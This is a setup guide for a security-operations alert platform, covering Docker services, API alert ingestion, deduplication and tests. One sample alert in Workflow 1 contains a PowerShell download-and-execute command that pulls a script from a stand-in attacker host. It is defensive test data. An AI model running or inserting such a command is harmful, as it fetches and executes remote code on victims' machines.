# Getting Started - AI-Native SOC Platform Phase 1

## Prerequisites

- Python 3.11+
- Docker & Docker Compose (for local development)
- PostgreSQL 15+ (if not using Docker)
- Neo4j 5.14+ (if not using Docker)
- Redis 7+ (if not using Docker)

## Quick Start with Docker Compose

### Step 1: Start Services

```bash
cd d:\Projects\ai-assisted-soc

# Start all services (API, PostgreSQL, Neo4j, Redis)
docker-compose up -d

# Wait for services to be ready
timeout 30
```

### Step 2: Verify Services

```bash
# Check API health
curl http://localhost:8000/health

# View API documentation
# Open in browser: http://localhost:8000/docs

# Check PostgreSQL
docker-compose exec postgres psql -U soc_user -d soc_platform -c "SELECT 1"

# Check Neo4j
# Open in browser: http://localhost:7474 (username: neo4j, password: soc_password)
```

### Step 3: Ingest Your First Alert

```bash
# Terminal 1: Open API docs
# http://localhost:8000/docs

# Use the API to ingest an alert
curl -X POST "http://localhost:8000/api/v1/alerts/ingest" \
  -H "Content-Type: application/json" \
  -d '{
    "source": "crowdstrike",
    "raw_alert": {
      "timestamp": 1723305600000,
      "name": "Test Suspicious Process",
      "severity": 4,
      "event_type": "process_execution",
      "user_id": "test.user",
      "user_name": "Test User",
      "computer_name": "TEST-HOST-001",
      "host_id": "host-001",
      "local_ip": "192.168.1.100",
      "remote_ip": "203.0.113.5",
      "process_name": "powershell.exe",
      "process_path": "C:\\Windows\\System32\\powershell.exe",
      "command_line": "powershell.exe -Hidden"
    }
  }'

# Response:
# {
#   "status": "accepted",
#   "alert_id": "c3d4e5f6-...",
#   "investigation_id": "a1b2c3d4-...",
#   "correlation_id": "...",
#   "occurrence_count": 1,
#   "severity": "high",
#   "source": "CrowdStrike",
#   "timestamp_received": "2024-08-10T15:30:00Z"
# }
```

### Step 4: Get Pending Alerts

```bash
# Get alerts pending evidence collection
curl http://localhost:8000/api/v1/alerts/pending

# Response shows all ingested alerts not yet processed
```

### Step 5: View Service Stats

```bash
curl http://localhost:8000/api/v1/alerts/stats

# Response:
# {
#   "tracked_alerts": 1,
#   "pending_evidence_collection": 1,
#   "dedup_window_seconds": 1800
# }
```

## Local Development (Without Docker)

### Step 1: Install Dependencies

```bash
cd d:\Projects\ai-assisted-soc

# Create virtual environment
python -m venv venv

# Activate virtual environment
# On Windows:
venv\Scripts\activate
# On macOS/Linux:
source venv/bin/activate

# Install requirements
pip install -r requirements.txt
```

### Step 2: Start Database Services (Docker only)

```bash
# In a separate terminal, start just the databases
docker-compose up -d postgres neo4j redis

# Wait for services
timeout 30
```

### Step 3: Start FastAPI Server

```bash
# Terminal 1: Run FastAPI
uvicorn backend.main:app --reload --port 8000

# Should see:
# INFO:     Uvicorn running on http://127.0.0.1:8000
# INFO:     Application startup complete
```

### Step 4: Test the API

```bash
# Terminal 2: Test endpoints
curl http://localhost:8000/health

# Or use interactive API docs
# http://localhost:8000/docs
```

### Step 5: Run Tests

```bash
# Terminal 3: Run tests
pytest backend/tests/ -v

# Run specific test file
pytest backend/tests/test_alert_normalizer.py -v

# Run with coverage
pytest backend/tests/ --cov=backend --cov-report=html
```

## Example Workflows

### Workflow 1: Ingest CrowdStrike Alert

```bash
#!/bin/bash

# Ingest a CrowdStrike alert
curl -X POST "http://localhost:8000/api/v1/alerts/ingest" \
  -H "Content-Type: application/json" \
  -d '{
    "source": "crowdstrike",
    "raw_alert": {
      "timestamp": '$(date +%s000)',
      "name": "Suspicious PowerShell Activity",
      "description": "Unauthorized PowerShell execution detected",
      "severity": 4,
      "event_type": "process_execution",
      "user_id": "attacker",
      "user_name": "Attacker Account",
      "computer_name": "COMPROMISED-PC",
      "host_id": "compromised-host-123",
      "local_ip": "10.0.1.50",
      "remote_ip": "203.0.113.5",
      "process_name": "powershell.exe",
      "process_path": "C:\\Windows\\System32\\powershell.exe",
      "command_line": "powershell.exe -NoProfile -Hidden -Command \u0027IEX(New-Object Net.WebClient).DownloadString(\\\"http://attacker.com/payload.ps1\\\")\u0027",
      "rule_id": "CS-SUSP-PS-001",
      "rule_name": "Suspicious PowerShell Execution",
      "mitre_attacks": ["T1086", "T1059.001"]
    }
  }' | jq .
```

### Workflow 2: Batch Ingest Splunk Alerts

```bash
#!/bin/bash

curl -X POST "http://localhost:8000/api/v1/alerts/ingest-batch" \
  -H "Content-Type: application/json" \
  -d '{
    "source": "splunk",
    "alerts": [
      {
        "_time": "'$(date -I)T10:00:00Z'",
        "alert_name": "High Failed Logins",
        "description": "Brute force login attempts",
        "severity": "high",
        "user": "admin",
        "host": "SERVER-001",
        "src_ip": "192.168.1.100",
        "dest_ip": "10.0.0.50",
        "count": 50
      },
      {
        "_time": "'$(date -I)T10:05:00Z'",
        "alert_name": "Lateral Movement",
        "description": "Lateral movement detected",
        "severity": "critical",
        "user": "service_account",
        "host": "SERVER-002",
        "src_ip": "10.0.0.50",
        "dest_ip": "10.0.0.51",
        "parent_process": "svchost.exe"
      }
    ]
  }' | jq .
```

### Workflow 3: Deduplicate Similar Alerts

```bash
#!/bin/bash

# Send the same alert twice
ALERT='{
  "source": "crowdstrike",
  "raw_alert": {
    "timestamp": '$(date +%s000)',
    "name": "Duplicate Test",
    "severity": 3,
    "event_type": "process_execution",
    "user_id": "user1",
    "user_name": "User One",
    "computer_name": "HOST-001",
    "host_id": "host-001",
    "process_name": "cmd.exe"
  }
}'

# First ingestion
echo "First alert ingestion:"
curl -s -X POST "http://localhost:8000/api/v1/alerts/ingest" \
  -H "Content-Type: application/json" \
  -d "$ALERT" | jq '.occurrence_count, .status'

# Second ingestion (should be deduplicated)
echo "Second alert ingestion (should be duplicate):"
curl -s -X POST "http://localhost:8000/api/v1/alerts/ingest" \
  -H "Content-Type: application/json" \
  -d "$ALERT" | jq '.occurrence_count, .status, .parent_alert_id'
```

### Workflow 4: Monitor Service Health

```bash
#!/bin/bash

# Health check
echo "=== Health Check ==="
curl -s http://localhost:8000/health | jq .

# Service stats
echo -e "\n=== Alert Service Stats ==="
curl -s http://localhost:8000/api/v1/alerts/stats | jq .

# Evidence collection stats
echo -e "\n=== Evidence Collection Stats ==="
curl -s http://localhost:8000/api/v1/evidence/stats | jq .
```

## Debugging

### Check Container Logs

```bash
# API logs
docker-compose logs -f api

# PostgreSQL logs
docker-compose logs -f postgres

# Neo4j logs
docker-compose logs -f neo4j
```

### Connect to PostgreSQL

```bash
# Shell into PostgreSQL container
docker-compose exec postgres psql -U soc_user -d soc_platform

# Query alerts table
SELECT alert_id, source_name, severity, timestamp_received FROM alerts LIMIT 10;

# Count alerts
SELECT COUNT(*) FROM alerts;

# Exit
\q
```

### Access Neo4j Browser

```bash
# Open in browser
http://localhost:7474

# Login with:
# Username: neo4j
# Password: soc_password

# Run Cypher query to list entities
MATCH (e:Entity) RETURN e LIMIT 10
```

### Run Tests with Output

```bash
# Verbose test output
pytest backend/tests/ -vv -s

# Show print statements
pytest backend/tests/test_alert_normalizer.py -s

# Stop on first failure
pytest backend/tests/ -x

# Run specific test method
pytest backend/tests/test_alert_normalizer.py::test_crowdstrike_normalization -vv
```

## Common Issues

### Issue: "Connection refused" when connecting to PostgreSQL

**Solution**: Ensure PostgreSQL container is running
```bash
docker-compose ps
docker-compose up -d postgres
```

### Issue: Port 8000 already in use

**Solution**: Use a different port
```bash
uvicorn backend.main:app --port 8001
```

### Issue: "No module named 'backend'"

**Solution**: Ensure you're running from the project root and have activated venv
```bash
cd d:\Projects\ai-assisted-soc
venv\Scripts\activate  # Windows
source venv/bin/activate  # macOS/Linux
```

### Issue: Docker containers won't start

**Solution**: Check Docker daemon and try rebuilding
```bash
docker-compose down -v
docker-compose up -d --build
```

## Next Steps

1. **Explore the API**: Open http://localhost:8000/docs and try endpoints
2. **Read the code**: Start with [backend/main.py](backend/main.py)
3. **Run tests**: `pytest backend/tests/ -v`
4. **Modify normalizers**: Add support for your security tools
5. **Extend collectors**: Implement custom evidence collectors
6. **Integrate databases**: Connect to real PostgreSQL and Neo4j
7. **Move to Phase 2**: Implement Correlation & Compression

## Useful Commands

```bash
# Stop all services
docker-compose down

# Stop and remove volumes (clean slate)
docker-compose down -v

# View all logs
docker-compose logs

# Rebuild images
docker-compose up -d --build

# Run specific service only
docker-compose up -d api

# Execute command in running container
docker-compose exec api bash

# View resource usage
docker stats
```

## References

- [API Documentation](README.md)
- [Architecture Document](../C:\tmp\ai-native-soc-platform\ARCHITECTURE.md)
- [FastAPI Docs](https://fastapi.tiangolo.com/)
- [Docker Compose Docs](https://docs.docker.com/compose/)
- [PostgreSQL Docs](https://www.postgresql.org/docs/)
- [Neo4j Docs](https://neo4j.com/docs/)

## Support

For issues or questions:
1. Check logs: `docker-compose logs`
2. Review tests: `backend/tests/`
3. Consult original design: `C:\tmp\ai-native-soc-platform\`
4. Read inline code comments
